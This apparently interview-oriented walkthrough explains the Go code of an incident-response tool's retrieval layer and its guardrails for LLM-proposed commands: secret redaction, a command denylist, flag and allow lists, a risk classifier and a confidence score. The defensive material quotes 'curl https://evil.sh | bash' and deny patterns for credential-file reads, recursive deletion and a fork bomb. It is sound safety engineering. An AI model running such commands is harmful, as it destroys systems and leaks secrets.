# Part 21 — Code Walkthrough: RAG and Cognition Adapters

`adapters/rag/*` and `adapters/cognition/*`. The retrieval machinery and the guardrails.

## `rag/embed/hashing` — the offline embedder

Covered in Part 9. Registers as `stub`, produces 256 dimensions, L2-normalised, hashes tokens
and bigrams with FNV-1a. Its purpose: the entire RAG path runs with no API key and
deterministically. Be honest about it — lexical, not semantic.

## `rag/embed/cached` — the decorator

```go
type Embedder struct {
    inner ports.Embedder
    cache ports.Cache
    ttl   time.Duration
    log   ports.Logger
}

func Wrap(inner ports.Embedder, cache ports.Cache, ttl time.Duration, log ports.Logger) ports.Embedder {
    if inner == nil || cache == nil {
        return inner       // nothing to cache with: return the original untouched
    }
    return &Embedder{inner: inner, cache: cache, ttl: ttl, log: log.With("component", "embed-cache")}
}

func (e *Embedder) Name() string    { return e.inner.Name() + "+cache" }
func (e *Embedder) Dimensions() int { return e.inner.Dimensions() }
```

The **decorator pattern**: it implements the same interface it wraps. Callers cannot tell the
difference, and `Name()` composing to `openai:nomic-embed-text+cache` means the startup log tells
you caching is active.

```go
func (e *Embedder) Embed(ctx context.Context, text string) ([]float32, error) {
    key := e.keyFor(text)

    if raw, ok, err := e.cache.Get(ctx, key); err == nil && ok {
        if vec, err := decode(raw); err == nil {
            e.log.Debug("embedding cache hit", "key", key)
            return vec, nil
        }
    } else if err != nil {
        e.log.Warn("embedding cache read failed", "err", err.Error())
    }

    vec, err := e.inner.Embed(ctx, text)
    if err != nil { return nil, err }
    if err := e.cache.Set(ctx, key, encode(vec), e.ttl); err != nil {
        e.log.Warn("embedding cache write failed", "err", err.Error())
    }
    return vec, nil
}
```

**A broken cache is never fatal.** Read error → log and continue to the real embedder. Corrupt
payload → ignore it and re-embed. Write error → log and return the vector anyway. A cache that
can take down the feature it accelerates is worse than no cache.

The key and the encoding, both deliberate:

```go
func (e *Embedder) keyFor(text string) string {
    sum := sha256.Sum256([]byte(e.inner.Name() + "\x00" + text))
    return "emb:" + hex.EncodeToString(sum[:16])
}

func encode(vec []float32) []byte {
    buf := make([]byte, 4*len(vec))
    for i, v := range vec {
        binary.LittleEndian.PutUint32(buf[i*4:], math.Float32bits(v))
    }
    return buf
}
```

- The model name is in the key, separated by a NUL byte so `"ab"+"c"` cannot collide with
  `"a"+"bc"`. Switching embedding models cannot serve vectors of the wrong dimension.
- Raw float32 bytes rather than JSON: 4 bytes per dimension instead of ~12, and no parse cost.
  For 768 dimensions that is 3KB versus roughly 9KB, per cached entry.

## `rag/vector/memory` — brute-force cosine

Holds runbooks in a map with an insertion-ordered slice of ids, computes cosine against every
one, sorts, truncates to `k`. O(n) per query, which is fine for hundreds of runbooks and removes
pgvector from the local development path entirely. `sort.SliceStable` keeps ties in insertion
order so results are reproducible.

## `rag/rerank` — the heuristic

```go
func (h Heuristic) Rerank(_ context.Context, query string, matches []domain.RunbookMatch, top int) ([]domain.RunbookMatch, error) {
    qTokens := tokenSet(query)
    now := ...
    for _, m := range matches {
        overlap := jaccard(qTokens, tokenSet(m.Runbook.Text()))
        score := 0.6*m.Score + 0.4*overlap

        reasons := make([]string, 0, 3)
        if strings.Contains(strings.ToLower(query), strings.ToLower(firstWords(m.Runbook.Title, 3))) {
            score += 0.05
            reasons = append(reasons, "title appears in query")
        }
        if age := now.Sub(m.Runbook.CreatedAt); !m.Runbook.CreatedAt.IsZero() && age < 30*24*time.Hour {
            score += 0.05
            reasons = append(reasons, "verified in the last 30 days")
        }
        if len(m.Runbook.Commands) == 0 {
            score -= 0.2
            reasons = append(reasons, "no commands recorded")
        }
        m.Score  = clamp01(score)
        m.Stage  = "rerank:heuristic"
        m.Reason = strings.Join(append([]string{"lexical overlap " + pct(overlap)}, reasons...), "; ")
        scored = append(scored, m)
    }
    sort.SliceStable(scored, func(i, j int) bool { return scored[i].Score > scored[j].Score })
    ...
}
```

**Jaccard similarity** is `|intersection| / |union|` over token sets — the fraction of distinct
words the two texts share. Blending it 60/40 with the vector score combines semantic similarity
with literal word overlap, which is a cheap approximation of what a cross-encoder does properly.

The recency bonus encodes a real operational belief: a runbook verified last week is more likely
to still be correct than one from a year ago, because infrastructure drifts.

Every match carries a human-readable `Reason` (`"lexical overlap 8%; verified in the last 30
days"`), which appears in the email. **Explainable ranking** — the reviewer can see why a runbook
was chosen and dismiss it if the reason is weak.

The LLM reranker lives in `cognition/llm/openai/rerank.go` because it is an OpenAI adapter; same
interface, model-scored, returns a written reason.

## `rag/cache` — memory and Redis

The memory cache is bounded, with approximate eviction:

```go
// evict clears expired entries, then drops arbitrary keys if still over budget.
// Approximate eviction is fine: a cache miss only costs one embedding call.
func (m *Memory) evict() {
    now := m.clock.Now()
    for k, e := range m.items {
        if !e.expires.IsZero() && now.After(e.expires) { delete(m.items, k) }
    }
    drop := len(m.items) - m.max + m.max/10
    for k := range m.items {
        if drop <= 0 { return }
        delete(m.items, k)
        drop--
    }
}
```

Not LRU. Expired entries go first, then arbitrary keys, and it over-evicts by 10% so eviction is
not triggered on every subsequent write. The comment justifies the choice: proper LRU needs a
linked list plus a map and more locking, and the cost of a wrong eviction here is one embedding
call. **Choosing the cheap-and-adequate algorithm, and writing down why, is a senior move.**

Note also: `Redis.Close()` is a deliberate no-op, because the shared client belongs to the
`Env`, not to the cache.

## `cognition/prompt` — the prompt builder

Covered in Part 10. Two things to remember: `PlanSchema` lives beside the system prompt so
instruction and parser cannot drift, and `sort.Strings(keys)` makes label rendering deterministic
so the embedding cache stays useful. It also handles the empty-retrieval case explicitly
("None matched. Treat this as a new failure mode.") rather than leaving a silence the model would
fill by inventing.

## `cognition/llm/openai` — the client

Covered in Part 10 for JSON handling. The transport details worth knowing:

```go
return retry.Do(ctx, retry.Default(), func(ctx context.Context) error {
    req, err := http.NewRequestWithContext(ctx, http.MethodPost, c.baseURL+path, bytes.NewReader(body))
    if err != nil { return retry.Permanent(err) }
    req.Header.Set("Content-Type", "application/json")
    req.Header.Set("Authorization", "Bearer "+c.apiKey)

    resp, err := c.http.Do(req)
    if err != nil { return fmt.Errorf("openai %s: %w", path, err) }
    defer resp.Body.Close()

    raw, readErr := io.ReadAll(io.LimitReader(resp.Body, 8<<20))
    if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500 {
        return fmt.Errorf("openai %s: transient status %d: %s", path, resp.StatusCode, snippet(raw))
    }
    if resp.StatusCode >= 400 {
        return retry.Permanent(fmt.Errorf("openai %s: status %d: %s", path, resp.StatusCode, snippet(raw)))
    }
    ...
})
```

**Error classification is the point.** `429` and `5xx` are transient and worth retrying; `4xx`
is wrapped in `retry.Permanent` and fails immediately, because retrying a malformed request or a
bad API key three times just wastes three times as long. A retry policy without classification is
a bug generator.

`io.LimitReader(resp.Body, 8<<20)` bounds the response at 8MB, so a misbehaving or malicious
endpoint cannot exhaust memory. `snippet()` truncates the error body to 300 characters so log
lines stay readable.

The retry helper itself (`internal/platform/retry`) is exponential backoff with a cap, honouring
context cancellation between attempts:

```go
wait := time.Duration(float64(p.Base) * math.Pow(2, float64(attempt)))
if p.Max > 0 && wait > p.Max { wait = p.Max }
```

Default: 3 attempts, 200ms base, 2s cap.

## `cognition/guard/redact.go`

```go
var secretPatterns = []Rule{
    {Label: "AWS_KEY",     Re: regexp.MustCompile(`\b(?:AKIA|ASIA)[0-9A-Z]{16}\b`)},
    {Label: "AWS_SECRET",  Re: regexp.MustCompile(`(?i)\baws_?secret_?access_?key\b\s*[:=]\s*\S+`)},
    {Label: "PRIVATE_KEY", Re: regexp.MustCompile(`(?s)-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----`)},
    {Label: "JWT",         Re: regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b`)},
    {Label: "BEARER",      Re: regexp.MustCompile(`(?i)\b(?:bearer|token)\s+[A-Za-z0-9._\-]{12,}`)},
    {Label: "GITHUB_PAT",  Re: regexp.MustCompile(`\bgh[pousr]_[A-Za-z0-9]{20,}\b`)},
    {Label: "SLACK",       Re: regexp.MustCompile(`\bxox[abprs]-[A-Za-z0-9-]{10,}\b`)},
    {Label: "OPENAI_KEY",  Re: regexp.MustCompile(`\bsk-[A-Za-z0-9_\-]{20,}\b`)},
    {Label: "DSN_PASSWORD",Re: regexp.MustCompile(`(?i)\b([a-z0-9+.\-]+)://([^:@\s/]+):([^@\s/]+)@`)},
    {Label: "ASSIGNMENT",  Re: regexp.MustCompile(`(?i)\b(password|passwd|secret|api[_-]?key|access[_-]?key|auth[_-]?token|client[_-]?secret)\b\s*[:=]\s*("[^"]*"|'[^']*'|\S+)`)},
    {Label: "BASIC_AUTH",  Re: regexp.MustCompile(`(?i)\bauthorization\s*[:=]\s*\S+`)},
}
```

Details: `(?s)` makes `.` match newlines, needed for multi-line PEM blocks. `(?i)` is
case-insensitive. `JWT` keys off the `eyJ` prefix, which is `{"` base64-encoded. The replacement
is a **labelled marker** — `[REDACTED:DSN_PASSWORD]` — so a reviewer can see that something was
removed and what kind, rather than staring at a blank.

Verified against real inputs:

```
connect postgres://svc:s3cr3tp4ss@db.internal:5432/checkout failed
  → connect [REDACTED:DSN_PASSWORD]db.internal:5432/checkout failed
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/...   → [REDACTED:AWS_SECRET]
password: hunter2hunter2                           → [REDACTED:ASSIGNMENT]
sk-abcdefghijklmnopqrstuvwxyz012345                → [REDACTED:OPENAI_KEY]
paged oncall@example.com about it                  → paged [REDACTED:EMAIL] about it
```

And one deliberate omission, documented in the code:

```go
// Note: IP addresses are deliberately not redacted by default. They are usually
// the most useful token in a network incident. Add them via
// WT_INPUT_REDACT_PATTERNS if your policy requires it.
```

That is a **security-versus-utility judgement stated explicitly with an escape hatch**. Exactly
the kind of tradeoff interviewers want to hear you reason about rather than default on.

## `cognition/guard/inspect.go` — the command linter

### Segmentation: why a regex over the raw string is not enough

```go
func segments(run string) []string {
    replacer := strings.NewReplacer(
        "&&", "\n", "||", "\n", ";", "\n", "|", "\n", "\r", "\n",
        "$(", "\n", "`", "\n",
    )
    raw := strings.Split(replacer.Replace(run), "\n")
    ...
}
```

`kubectl get pods && rm -rf /tmp/x` looks harmless if you only check the first word. Splitting on
`&&`, `||`, `;`, `|`, `$(` and backticks exposes each command that would actually run.

### And why segments alone are not enough either — a real bug

The denylist originally inspected only segments. So `curl https://evil.sh | bash` slipped
through: the "pipe from network into a shell" rule needs to see the pipe, and splitting on `|`
had already destroyed it. Found by a probe test, fixed by checking both:

```go
// The whole line is checked first, because some rules are about composition
// (piping a download into a shell) and would be invisible once the line is split.
// Then each segment is checked on its own, which catches a destructive command
// hidden behind && or a subshell.
func (d DenyList) Inspect(cmd domain.Command) error {
    candidates := append([]string{cmd.Run}, segments(cmd.Run)...)
    for _, candidate := range candidates {
        for _, r := range d.rules {
            if r.Re.MatchString(candidate) {
                return domain.Block("%s (matched %q)", r.Label, strings.TrimSpace(candidate))
            }
        }
    }
    return nil
}
```

Great interview story: a plausible-looking implementation with a specific blind spot, found by
testing the *category* rather than the happy path.

### The three inspectors

**`DenyList`** — 24 built-in destructive patterns plus configurable extras, each with a human
label:

```go
{Label: "recursive delete",              Re: regexp.MustCompile(`(?i)\brm\b[^|;]*\s-{1,2}[a-z]*r`)},
{Label: "filesystem format",             Re: regexp.MustCompile(`(?i)\b(mkfs(\.\w+)?|fdisk|parted|wipefs)\b`)},
{Label: "raw device write",              Re: regexp.MustCompile(`(?i)\bdd\b[^|]*\bof=/dev/`)},
{Label: "fork bomb",                     Re: regexp.MustCompile(`:\s*\(\s*\)\s*\{`)},
{Label: "namespace deletion",            Re: regexp.MustCompile(`(?i)kubectl\s+delete\s+(ns|namespace)\b`)},
{Label: "persistent volume deletion",    Re: regexp.MustCompile(`(?i)kubectl\s+delete\s+(pv|pvc|persistentvolume\w*)\b`)},
{Label: "cluster-wide resource deletion",Re: regexp.MustCompile(`(?i)kubectl\s+delete\s+[^|]*(--all\b|-A\b|--all-namespaces\b)`)},
{Label: "infrastructure destroy",        Re: regexp.MustCompile(`(?i)\bterraform\s+destroy\b|\bpulumi\s+destroy\b`)},
{Label: "destructive sql",               Re: regexp.MustCompile(`(?i)\b(drop\s+(table|database|schema)|truncate\s+table|delete\s+from\s+\w+\s*;?\s*$)`)},
{Label: "pipe from network into a shell",Re: regexp.MustCompile(`(?i)\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba)?sh\b`)},
{Label: "history or credential exfiltration", Re: regexp.MustCompile(`(?i)\b(cat|less|more|tail)\b[^|]*(/etc/shadow|id_rsa|\.aws/credentials|\.kube/config)`)},
...
```

The label is what the reviewer reads, so it is written for a human:
`denylist: namespace deletion (matched "kubectl delete namespace checkout")`.

One refinement worth noting: the recursive-delete rule started as something that also matched
plain `rm file`. It was tightened to require an `-r`-style flag, because a guardrail that blocks
harmless commands trains people to ignore it.

**`FlagList`** — arguments that turn a recoverable action into an unrecoverable one:

```go
var denyFlags = []string{
    "--force", "--no-preserve-root", "--grace-period=0",
    "--yes-i-really-mean-it", "--purge", "--cascade=orphan",
    "--disable-eviction", "--ignore-daemonsets", "--delete-emptydir-data",
}
```

Matching is on `" flag "` and `" flag="`, so `--forceps` is not a false positive.

**`AllowList`** — a curated set of ~70 diagnostic and remediation binaries (`kubectl`, `helm`,
`journalctl`, `df`, `dig`, `psql`, `jq`, `aws`, `terraform`, …). Anything else is blocked, which
is how `nmap -sS 10.0.0.0/8` gets refused. Note the binary extraction skips prefixes:

```go
// binaryOf extracts the executable from a segment, skipping env assignments and
// sudo so `sudo systemctl restart x` is judged on systemctl.
```

Denylist and allowlist together are **defence in depth**: the denylist catches known-bad, the
allowlist catches unknown-anything.

## `cognition/guard/classify.go` — the risk classifier

```go
var (
    reDangerous = regexp.MustCompile(`(?i)\b(rm|mkfs|dd|shutdown|reboot|halt|poweroff|destroy|drop|truncate|flushall|flushdb|wipefs|prune)\b|--force|--purge|--grace-period=0`)
    reMutating  = regexp.MustCompile(`(?i)\b(apply|create|patch|edit|replace|scale|autoscale|set|rollout|restart|stop|start|enable|disable|delete|evict|cordon|uncordon|drain|taint|annotate|label|exec|cp|upgrade|install|rollback|resize|kill|update|insert|alter|reload)\b`)
    reReadOnly  = regexp.MustCompile(`(?i)^(get|describe|logs|top|events|...|ls)$`)
)
```

```go
// Classify implements ports.RiskClassifier. Segments are judged independently and
// the worst one wins, so a read wrapped around a delete is not read.
func (c Classifier) Classify(cmd domain.Command) domain.RiskLevel {
    worst := domain.RiskRead
    for _, seg := range segments(cmd.Run) {
        switch {
        case reDangerous.MatchString(seg): promote(domain.RiskDangerous)
        case reMutating.MatchString(seg):  promote(domain.RiskMutate)
        case isReadOnly(seg):              // leave as read
        default:
            // Unknown shapes are treated as state-changing. Understating risk is the
            // expensive mistake here; overstating it only costs the reviewer a glance.
            promote(domain.RiskMutate)
        }
    }
    return worst
}
```

Three principles, all quotable:

1. **Worst segment wins.** A compound command is as dangerous as its most dangerous part.
2. **Unknown defaults to mutating.** Asymmetric costs: understating risk can cause an outage,
   overstating it costs a glance.
3. **The subcommand is checked, not just the binary** — `kubectl get` and `kubectl delete` share
   a binary and do not share a risk level:

```go
func isReadOnly(seg string) bool {
    fields := strings.Fields(seg)
    if reReadOnly.MatchString(strings.ToLower(trimPath(fields[0]))) { return true }
    for _, f := range fields[1:] {
        if strings.HasPrefix(f, "-") { continue }
        return reReadOnly.MatchString(strings.ToLower(f))     // first non-flag arg = subcommand
    }
    return false
}
```

Verified: two commands the model had labelled `read` were corrected to `mutate`.

## `cognition/score` — the confidence model

The full function is in Part 16's neighbour file; the structure is:

| Signal | Contribution |
| --- | --- |
| a parsed, schema-valid plan | +0.15 baseline |
| retrieval support | +0.3 × match score |
| retrieved runbook's signature == this incident's | +0.10 |
| evidence depth (≥20 / ≥5 / >0 log lines) | +0.15 / +0.10 / +0.05 |
| cluster events present | +0.05 |
| critic approved | +0.15, +0.05 more if no rewrite was needed |
| critic rejected | −0.20 |
| verification steps present | +0.05 |
| rollback steps present | +0.05 |
| **no executable command survived** | **−0.25** |
| each blocked command | −0.10 |
| empty root cause | −0.15 |
| the model's own confidence claim | +0.1 × claim (capped) |

Then `clamp01` and round to two decimals.

Four things to say about it:

**It is explainable.** Every term is a sentence, so you can tell a reviewer *why* an incident
scored 0.41. A learned model would be more accurate and completely opaque, which is the wrong
trade for a number whose whole job is to calibrate human trust.

**The model's self-assessment is capped at 0.1.** A confident hallucination cannot make itself
look trustworthy.

**Human-verified evidence dominates**: retrieval support plus signature match is worth up to
0.4, more than any other single factor. The system trusts what humans have confirmed.

**The weights are hand-tuned, not learned.** Volunteer this as a limitation, along with the fix:
once there are enough approve/reject decisions, they are labelled training data — the
`ports.Scorer` interface means a learned scorer is one more driver.

Observed values across real runs: `0.10` (critic rejected twice, thin evidence), `0.41`,
`0.45`, `0.59`, `0.61`, `0.66`, `0.67`, `0.80` (critic approved after one rewrite, retrieval hit).
The spread is wide enough to be useful for a threshold, which is what
`WT_NOTIFY_MIN_CONFIDENCE` is for.

---

Next: **Part 22 — storage, delivery and the HTTP edge.**
